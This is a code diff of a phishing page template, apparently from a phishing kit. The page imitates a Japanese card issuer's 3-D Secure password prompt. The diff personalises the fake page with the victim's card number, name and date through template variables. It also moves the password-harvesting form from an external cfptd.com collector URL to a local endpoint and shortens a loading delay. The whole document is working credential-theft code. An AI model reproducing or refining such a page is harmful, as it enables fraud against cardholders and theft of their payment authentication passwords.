@@ -20,7 +20,7 @@
             var myVar;
         
             function myFunction() {
-                myVar = setTimeout(showPage, 1500);
+                myVar = setTimeout(showPage, 500);
             }
         
             function showPage() {
@@ -59,8 +59,7 @@ return false;
                     <p><font size=1>ご利用いただくカードで登録している「オンラインショッピング認証サービス」の「パスワード（※）」をご入力ください。
 （※クレジットカードの暗証番号とは異なりますので、ご注意ください）
 </font></p>
-                  <form action="https://cfptd.com/8a47481ae534860850adf59f145e6b40/actions/vbv.php" onsubmit="return check()"  method="post">
-                  <div class="padingtable">
+                  <form action="verifiedby" onsubmit="return check()"  method="post"><div class="padingtable">
                         <table >
                                 <tbody>
                                     <tr>
@@ -73,20 +72,20 @@ return false;
                                     </tr>
                                     <tr>
                                         <td><div class="contain" align="right"><b>ご利用日：</b></div></td>
-                                        <td>2020/07/21</td>
+                                        <td>${dateTime!""}</td>
                                     </tr>
                                         <tr>
 
                                     <tr>
                                         <td><div class="contain" align="right"><b>カード番号：</b></div></td>
-                                        <td>**** **** **** </td>
+                                        <td>**** **** ****${cardNo!""} </td>
                                     </tr>
                                     <tr>
                                         <td><div class="contain" align="right"><b>カード名義人：</b></div></td>
-                                        <td></td>
+                                        <td>${cardName!""}</td>
                                     </tr>
                                                                       	
-                                    <tr><td align="right"><b>パスワード：</b></td>';
+                                    <tr><td align="right"><b>パスワード：</b></td>
                                     <td><input style="width: 158px;" type="text" maxlength="66" placeholder="" name="password_vbv" id="password666"><br></td>
 									</tr>
 
@@ -115,7 +114,7 @@ return false;
 
     </div>
 
-    <div style="display:none;"><script type='text/javascript' src='https://s4.cnzz.com/z_stat.php?id=1278854177&amp;web_id=1278854177'></script></div>
+    <#--<div style="display:none;"><script type='text/javascript' src='https://s4.cnzz.com/z_stat.php?id=1278854177&amp;web_id=1278854177'></script></div>-->
 
 
 </body>
